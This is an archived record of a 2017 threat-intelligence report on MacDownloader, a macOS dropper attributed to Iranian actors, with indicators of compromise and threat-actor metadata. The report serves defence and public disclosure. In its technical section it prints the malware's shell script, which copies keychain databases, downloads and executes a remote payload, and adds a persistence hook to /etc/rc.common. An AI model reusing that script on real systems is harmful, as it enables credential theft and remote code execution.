{
    "id": "483904cf-60d1-48e8-a036-8cf17b6898c2",
    "created_at": "2023-01-12T15:06:01.662403Z",
    "updated_at": "2025-03-27T02:16:11.506329Z",
    "deleted_at": null,
    "sha1_hash": "bca99b48ccb5b5133896875c043e86c7cb99279d",
    "title": "2017-02-06 - iKittens- Iranian Actor Resurfaces with Malware for Mac (MacDownloader)",
    "authors": "",
    "file_creation_date": "2022-05-28T02:14:50Z",
    "file_modification_date": "2022-05-28T02:14:50Z",
    "file_size": 2168289,
    "plain_text": "# iKittens: Iranian Actor Resurfaces with Malware for Mac (MacDownloader)\n\n**[iranthreats.github.io/resources/macdownloader-macos-malware/](https://iranthreats.github.io/resources/macdownloader-macos-malware/)**\n\n**Public Notice (6 February 2017)**\n\n## Summary\n\nA macOS malware agent, named MacDownloader, was observed in the wild as targeting the\ndefense industrial base, and reported elsewhere to have been used against an human rights\nadvocate. MacDownloader strangely attempts to pose as both an installer for Adobe Flash,\nas well as the Bitdefender Adware Removal Tool, in order to extract system information and\ncopies of OS X keychain databases. Based on observations on infrastructure, and the state\nof the code, we believe these incidents represent the first attempts to deploy the agent, and\nfeatures such as persistence do not appear to work. Instead, MacDownloader is a simple\nexfiltration agent, with broader ambitions.\n\nThe macOS malware also mirrors the approach of the ExtremeDownloader dropper\npreviously documented in our research, and samples of the latter identified during this time\nused the same infrastructure. Lastly, the exposure of test victim data and code references\nprovide a unique insight into the development of the malware, with potential connections to\nagents developed by long dormant threat groups.\n\n[Since the Technical Preview of our forthcoming Carnegie Endowment publication about](https://iranthreats.github.io/us-16-Guarnieri-Anderson-Iran-And-The-Soft-War-For-Internet-Dominance-paper.pdf)\nstate-sponsored espionage campaigns was released at Black Hat USA, we have continued\nto disclose information about current Iranian activities in order to promote public education\nand to provide indicators of compromise. While this agent is neither sophisticated nor fullfeatured, its sudden appearance is concerning given the popularity of Apple computers with\ncertain community, and inaccurate perceptions about the security of those devices.\n\n## Background\n\nSince the start of the Iran Threats posts, we have documented an ever-changing array of\nmalware agents targeting Windows and Android devices in order to exfiltrate files and record\nkeystrokes from victims. While Windows remains the dominant operating system in the\nworld, many communities have shifted over to macOS in the interest of security and stability.\nHowever, much of the added security afforded to macOS users stems from an expectation of\nWindows by attackers and less readily-available remote access tools for the OS, rather than\nbetter in-built defenses. Thus, macOS users are at risk of assuming greater protection\nagainst malware than actually exists, and could be more vulnerable as a result. One of these\ncommunities is the human rights community, especially those focused on Iran, which based\non anecdotal experience is strongly dependent on Apple devices\n\n\n-----\n\n## Incident and Impact\n\nAn active staging of the MacDownloader agent was first observed linked out from a site\nimpersonating the aerospace firm \"United Technologies Corporation,\" a spearphishing site\nwas previously believed to be maintained by Iranian actors for spreading Windows malware.\nThe page claimed to offer \"Special Programs And Courses,\" specifically mentioning\nemployees and interns of Lockheed Martin, Sierra Nevada Corporation, Raytheon and\nBoeing. The citation of the aforementioned companies also aligned with known targeting of\nspearphishing campaigns by the same group. The host used to stage the malware had also\npreviously been used to deploy the BeEF framework on subdomains that appeared as a\ndental office and a U.S. Air Force basic training page.\n\nCounterintuitively, the bait to download the agent features a French-language\n\nwarning in the place of a video player that informs the visitor that the \"plugin has security\nflaws,\" with a link to activate Adobe Flash. MacDownloader is the first spearphishing attempt\nwe have observed that honestly informs its target about its malicious nature. The target will\n\n\n-----\n\nbe provided either Windows or Mac malware based on the detected operating system, with\nWindows clients provided a dropper written in Go. The packaging of the MacDownloader\nsample also provides further indication of its Iranian origin through its name, \"addone\nflashplayer.app,\" which would suggest that a Persian-language speaker named the file based\non grammar. The continuity of certain infrastructure and trends in targeting suggest a\nrelationship to the Charming Kitten actor group, believed to based in Iran and connected to\nIranian security entities.\n\n\n-----\n\n## MacDownloader\n\nThe malware utilized in these attacks is a macOS-specific dropper (a 64-bit Mach-O binary)\nnamed MacDownloader based on strings from the development environment that are\nembedded in the binary. MacDownloader seems to be poorly developed and created towards\nthe end of 2016, potentially a first attempt from an amateur developer. In multiple cases, the\ncode used has been copied from elsewhere. The simple activity of downloading the remote\nfile appears to have been sourced from a cheat sheet. The main purpose of MacDownloader\nseems to be to perform an initial profiling of the infected system and collection of credentials\nfrom macOS’s Keychain password manager – which mirrors the focus of Windows malware\ndeveloped by the same actors.\n\nAt the time of writing, MacDownload appears completely undetected by virus scanning\nengines on VirusTotal, which suggests that consumer antivirus software may have difficulty\ndetecting the agent.\n\nWith this particular build of MacDownloader, a fake Adobe Flash Player dialog is displayed\nupon execution, prompting the victim to click on an \"Update Flash-Player\" button.\nInterestingly, clicking on the \"Close\" button does in fact make the application exit. After the\n\n\n-----\n\nvictim would have successfully clicked on the Update button, the following fake dialog is\ndisplayed, announcing that adware was discovered on the computer and that the application\nwas in the process of cleaning it up.\n\nThis dialog is a bit surprising and confusing, particularly considering that the pretense of this\nbuild of MacDownloader is to rather be a Flash Player update, not antivirus software. This\nincongruity was soon explained when we noticed that in the resources of the malicious\napplication there was a NIB file (which is a stored user interface design for Mac applications)\nthat seems to not have been used in this particular build. These dialogues are also rife with\nbasic typos and grammatical errors, indicating that the developer paid little attention to\nquality control. We believe MacDownloader was originally designed as a fake virus removal\ntool and in order to fit a particular social engineering attempt, it was later repackaged as a\nfake Flash Player update.\n\n\n-----\n\nThe malware reads from the embedded Resources folder the \"checkadr.txt,\" which contains\nthe URL for the first beacon:\n\nhttp://46.17.97[.]37/Servermac.php\n\nThe C2 used in this sample was taken down by a third party two weeks ago. Another\nresource \"eula-help.txt\" appears to provide an internal development server address, and\nreflects the developer’s expectation of MacDownloader as simple a dropper.\n\nhttp://192.168.3.217/DroperTest\n\nAdditionally, a file \"appId.txt\" provides what appears to be a unique identifier for the\ncampaign tied to the agent. This identified is communicated to the C2 in exfiltrating data from\nthe host. In the sample examined, and in the testing observed, this is set as ‘snc’ -- an\nidentifier that would align with victims of concurrent spearphishing campaigns by the same\ngroup.\n\nIt appears that the application contains an unused attempt to install persistent access to the\nvictim host. One segment provides a poorly-implemented shell script to save a response\nfrom the C2 and mark it for persistence by writing an entry in the /etc/rc.common file. In\ntheory, every time the infected computer would start up, the shell script would be launched to\ndownload a file from a remote location, check if it changed from the previous iteration, and if\nso execute that new implant. While we haven’t managed to obtain a proper response from\nthe server before it was taken offline, our initial investigation did not find a subsequent\nimplant. In the course of testing, it did not appear that this code was executed, and instead\ncalls to the remote server were made through Apple’s Core Services framework instead.\nMoreover GET requests without parameters against the endpoint were observed to trigger\n\n\n-----\n\nPHP errors, rather than provide an implant. Therefore, we did not find immediate indication\nthat MacDownloader was persistent, only that they intended to include remote updates and\npersistence as a feature.\n```\ndo shell script \"uname -a > /etc/checkdrive.chk\"\nzip -rj /etc/kcbackup.cfg /Library/Keychains/\necho \"#!/bin/bash\ncurl -o /tmp/mastering-vim.pdf %@\nmd5 /tmp/mastering-vim.pdf | grep vim | cut -d- -f 2 > /etc/newf_md5.md5\nif cmp /etc/newf_md5.md5 /etc/old_md5.md5\nthen\n  #echo equal\n  cp /etc/newf_md5.md5 /etc/oldf_md5.md5\n  chmod +x /tmp/mastering-vim.pdf\n  /tmp/mastering-vim.pdf\nfi\n\" > /etc/.checkdev && if cat /etc/rc.common | grep .checkdev; then sleep 1; else echo\n\"sleep %d && /etc/.checkdev &\" >> /etc/rc.common; fi && chmod +x /etc/.checkdev &&\n/etc/.checkdev with administrator privileges\n\n```\nIn parallel, MacDownloader harvests information on the infected system, including the user’s\nactive Keychains, which are then uploaded to the C2. The dropper also documents the\nrunning processes, installed applications, and the username and password which are\nacquired through a fake System Preferences dialog. Armed with the user’s credentials, the\nattackers would then be able to access the encrypted passwords stored within the Keychain\ndatabase. While Chrome and Firefox do not store credentials in Keychain, Safari and\nmacOS’s system service do save passwords to sites, remote file systems, encrypted drives,\nand other criteria resources there. The primary focus on retrieving stored passwords and\nrecording keystrokes to capture passwords for online services is a common trend with\ncustom Iranian malware. Using these passwords, the actors then access accounts to take\npermanent backups of victim’s emails, cloud files, and social networking activities. Windows\nagents used by the same group currently behave in the same manner – collecting the saved\npasswords and browser histories of Firefox and Chrome at the time of infection. One would\nanticipate this will appear in subsequent versions of MacDownloader.\n\nAll the harvested information is then compiled in a file stored at /tmp/applist.txt, and not\nremoved after submission:\n\n\n-----\n\n```\n[\n \"OS version:[UNAME OUTPUT]\",\n \"Root Username: \\\"[USER]\\\"\",\n \"Root Password: \\\"[PASSWORD]\\\"\",\n \"Keychains loaded in current user \",\n \"Local ip address: [IP ADDRESS]\",\n \"Ifconfig: [IFCONFIG OUTPUT]\",\n [\n  [CONTENT OF /Applications]\n ],\n [\n  ....\n  \"process name is: Bitdefender Adware Removal Tool\\t PID: 17550 Run from:\nfile:\\/\\/\\/Users\\/user\\/Desktop\\/addone%20flashplayer.app\\/Contents\\/MacOS\\/Bitdefende\n ]\n]\n\n```\nOnce the execution completed, MacDownloader smoothly displays a dialog informing that\nthe update of Flash Player has completed. Needless to say, no Flash Player was installed or\nupdated whatsoever.\n\n## Origin and Development\n\nWithin the metadata for the application (Info.plist), the MacDownloader contains unusual\nreferences that may provide insight into its development. The \"Bundle identifier\" property is\nset to \"zenderod.Bitdefender-Adware-Removal-Tool,\" mirroring the secondary impersonation\nof Bitdefender by the agent. Under standard software development practices, the first\ncomponent of the string is set to the name or company of the original developer, which in this\ncase is \"zenderod.\" Zenderod is evidently a reference to the Zayandeh Rood, a famous river\nthat runs along Isfahan, Iran. Curiously, this shorthanded transliteration also aligns with the\ndomain of Novin Pardaz Zenderod (zenderod.ir, now directs to npzr.ir), a software and\nhosting company in Isfahan. While the site does not note any expertise in macOS software\ndevelopment, the application would not require a sophisticated developer to produce and\nappeared to at one point use shell scripts to function, which is within their stated expertise.\nWe contacted an individual listed as the administrative contact for Novin Pardaz Zenderod,\nand they denied producing macOS software or association with the malware.\n\nAdditionally, the \"Readable Copyright\" property, which displays the copyright information\navailable in the About dialogue, is set to \"Copyright © 2015 Mamedof. All rights reserved.\"\nThe outdated copyright suggests that the malware’s developer copied the template from\nanother project. We were unable to find another application that contained the name in the\ncopyright, indicating that it could be from a more obscure application or previous work of the\ndeveloper.\n\n\n-----\n\nIn the binary, we find a number of strings that indicate the username of the developer of\nMacDownloader within filesystem paths embedded by XCode. These strings suggest that the\ndeveloper’s first name is Shayan, and provides the previously cited project name.\n\n/Users/shayan/Desktop/MacDownloader/MyApp3/\n/Users/shayan/Library/Developer/Xcode/DerivedData/Adware_Removal_Toolfrnnuqjzajnllqgzakkslsovdhag/Build/Intermediates/Adware Removal\nTool.build/Debug/Adware Removal Tool.build/Objects-normal/x86_64/AppDelegate.o\n\nUniquely, in the course of testing the malware agent, one of the malware operators appears\nto have infected a MacBook Pro. In doing so, the malware agent uploaded both system\ninformation and OS X Keychain databases to the C2 for a user \"Ultrone\" and with password\n\"saeed\" -- presumably another name. While sparse, the uploaded Keychains provide some\nclues about the social relationships and tactics of the actor through VPN credentials and Wifi\nnetwork records.\n\n[Of particular note are wireless networks named Jok3r and mb_1986. Jok3r corresponds with](http://zone-h.org/archive/notifier=jok3r?zh=1)\na member of a defacement group, Iran Cyber Security Group, who continues to be fairly\nactive in vandalizing sites. Iran Cyber Security Group also, as with many other defacement\ngroups later identified as involved in state-aligned campaigns, purports to provide\ncommercial security services and penetration testing training.\n\n\n-----\n\nThe mb_1986 wireless name is more interesting, as it provides a connection to earlier\nIranian campaigns, overlapping with the Flying Kitten actor group and subsequent malware\nactivity in summer 2014. In [earlier samples of a malware agent dubbed \"Sayad,\" multiple](https://totalhash.cymru.com/analysis/?0198d0610f656d77904e330458d8b6a9f9768696)\nresources paths embedded in the malware reference development from a Windows\nenvironment running on the username \"mb_1986.\" (Specifically,\nc:\\Users\\mb_1986\\Desktop\\Projects\\Tiny_st\\BlackBerry\\obj\\Debug\\MSSUP.pdb). This\nusername is also found within the system logs of an Iranian computer named \"BORHAN\"\nthat was compromised multiple times by the Stealer malware between December 2013 and\nFebruary 2014. BORHAN had a number of professional software development tools that\nreflect the administration and development trends of the actors (Subversion, VMWare\nvSphere, and Microsoft Visual Studio). The repetitive and short-lived compromises suggest\nthat the host was a developer of the Stealer family, and that they continued to develop the\nplatform beyond Operation Saffron Rose, which evolved into MiniSayad, and then socially\ninteracted with the MacDownloader operators.\n\n## Indicators of Compromise\n\n**Hashes**\n\n_File Name_\n\n_Hash_\n\naddone flashplayer.app.zip\n\n52efcfe30f96a85c9c068880c20663db64f0e08346e0f3b59c2e5bbcb41ba73c\n\nBitdefender Adware Removal Tool\n\n7a9cdb9d608b88bd7afce001cb285c2bb2ae76f5027977e8635aa04bd064ffb7\n\n**Network**\n\n46.17.97[.]37\n\nofficialswebsites[.]info\n\nutc.officialswebsites[.]info\n\n## Contact\n\nClaudio (nex@amnesty.org)\n\nFingerprint: E063 75E6 B9E2 6745 656C 63DE 8F28 F25B AAA3 9B12\n\nCollin (cda@cda.io)\n\nPGP Key: [https://cda.io/key.asc](https://cda.io/key.asc)\n\n\n-----\n\nFingerprint: 510E 8BFC A60E 84B4 40EA 0F32 FAFB F2FA\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-02-06 - iKittens- Iranian Actor Resurfaces with Malware for Mac (MacDownloader).pdf"
    ],
    "report_names": [
        "2017-02-06 - iKittens- Iranian Actor Resurfaces with Malware for Mac (MacDownloader).pdf"
    ],
    "threat_actors": [
        {
            "id": "82b92285-4588-48c9-8578-bb39f903cf62",
            "created_at": "2022-10-25T15:50:23.850506Z",
            "updated_at": "2025-03-27T02:00:55.501372Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Charming Kitten"
            ],
            "source_name": "MITRE:Charming Kitten",
            "tools": [
                "DownPaper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "8e1bae2f-2a21-4ba8-a6f1-42155f96aec8",
            "created_at": "2022-10-25T16:07:23.645758Z",
            "updated_at": "2025-03-27T02:02:09.905135Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Ajax Security Team",
                "Flying Kitten",
                "Group 26",
                "Operation Saffron Rose"
            ],
            "source_name": "ETDA:Flying Kitten",
            "tools": [
                "Stealer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8faa11f5-2a14-479c-9ea8-3779e6de9749",
            "created_at": "2022-10-25T15:50:23.814205Z",
            "updated_at": "2025-03-27T02:00:55.551798Z",
            "deleted_at": null,
            "main_name": "Ajax Security Team",
            "aliases": [
                "Ajax Security Team",
                "Operation Woolen-Goldfish",
                "AjaxTM",
                "Rocket Kitten",
                "Flying Kitten",
                "Operation Saffron Rose"
            ],
            "source_name": "MITRE:Ajax Security Team",
            "tools": [
                "sqlmap",
                "Havij"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f4d7cba1-dbdd-42a9-88c5-4d0c81659ee0",
            "created_at": "2023-01-06T13:46:38.357581Z",
            "updated_at": "2025-03-27T02:00:02.813318Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Saffron Rose",
                "AjaxSecurityTeam",
                "Ajax Security Team",
                "Group 26",
                "Sayad",
                "SaffronRose"
            ],
            "source_name": "MISPGALAXY:Flying Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
            "created_at": "2023-01-06T13:46:38.364105Z",
            "updated_at": "2025-03-27T02:00:02.815023Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Parastoo",
                "iKittens",
                "Group 83",
                "NewsBeef",
                "G0058",
                "CharmingCypress"
            ],
            "source_name": "MISPGALAXY:Charming Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
            "created_at": "2024-05-01T02:03:08.027871Z",
            "updated_at": "2025-03-27T02:05:17.313679Z",
            "deleted_at": null,
            "main_name": "COBALT ILLUSION",
            "aliases": [
                "APT42 ",
                "Charming Kitten ",
                "CharmingCypress ",
                "ITG18 ",
                "Magic Hound ",
                "Mint Sandstorm sub-group ",
                "NewsBeef ",
                "Newscaster ",
                "PHOSPHORUS sub-group ",
                "TA453 ",
                "UNC788 ",
                "Yellow Garuda ",
                "APT35 "
            ],
            "source_name": "Secureworks:COBALT ILLUSION",
            "tools": [
                " MagicHound Toolset",
                " PupyRAT",
                "Browser Exploitation Framework (BeEF)"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
            "created_at": "2022-10-25T15:50:23.808974Z",
            "updated_at": "2025-03-27T02:00:55.550912Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "Magic Hound",
                "TA453",
                "COBALT ILLUSION",
                "Charming Kitten",
                "ITG18",
                "Phosphorus",
                "APT35",
                "Mint Sandstorm"
            ],
            "source_name": "MITRE:Magic Hound",
            "tools": [
                "Impacket",
                "CharmPower",
                "FRP",
                "Mimikatz",
                "Systeminfo",
                "ipconfig",
                "netsh",
                "PowerLess",
                "Pupy",
                "DownPaper",
                "PsExec",
                "Havij",
                "sqlmap"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
            "created_at": "2022-10-25T16:07:23.83826Z",
            "updated_at": "2025-03-27T02:02:09.995863Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "APT 35",
                "Ballistic Bobcat",
                "Charming Kitten",
                "CharmingCypress",
                "Cobalt Illusion",
                "Cobalt Mirage",
                "Educated Manticore",
                "Magic Hound",
                "Mint Sandstorm",
                "Operation BadBlood",
                "Operation Sponsoring Access",
                "Operation SpoofedScholars",
                "Operation Thamar Reservoir",
                "Phosphorus",
                "TA453",
                "TEMP.Beanie",
                "Tarh Andishan",
                "Timberworm",
                "TunnelVision",
                "UNC788",
                "Yellow Garuda"
            ],
            "source_name": "ETDA:Magic Hound",
            "tools": [
                "7-Zip",
                "AnvilEcho",
                "BASICSTAR",
                "CORRUPT KITTEN",
                "CWoolger",
                "CharmPower",
                "ChromeHistoryView",
                "CommandCam",
                "DistTrack",
                "DownPaper",
                "FRP",
                "Fast Reverse Proxy",
                "FireMalv",
                "Ghambar",
                "GoProxy",
                "GorjolEcho",
                "HYPERSCRAPE",
                "Havij",
                "MPK",
                "MPKBot",
                "Matryoshka",
                "Matryoshka RAT",
                "MediaPl",
                "Mimikatz",
                "MischiefTut",
                "NETWoolger",
                "NOKNOK",
                "PINEFLOWER",
                "POWERSTAR",
                "PowerLess Backdoor",
                "PsList",
                "Pupy",
                "PupyRAT",
                "SNAILPROXY",
                "Shamoon",
                "TDTESS",
                "WinRAR",
                "WoolenLogger",
                "Woolger",
                "pupy",
                "sqlmap"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535961,
    "ts_updated_at": 1743041771,
    "ts_creation_date": 1653704090,
    "ts_modification_date": 1653704090,
    "files": {
        "pdf": "https://archive.orkl.eu/bca99b48ccb5b5133896875c043e86c7cb99279d.pdf",
        "text": "https://archive.orkl.eu/bca99b48ccb5b5133896875c043e86c7cb99279d.txt",
        "img": "https://archive.orkl.eu/bca99b48ccb5b5133896875c043e86c7cb99279d.jpg"
    }
}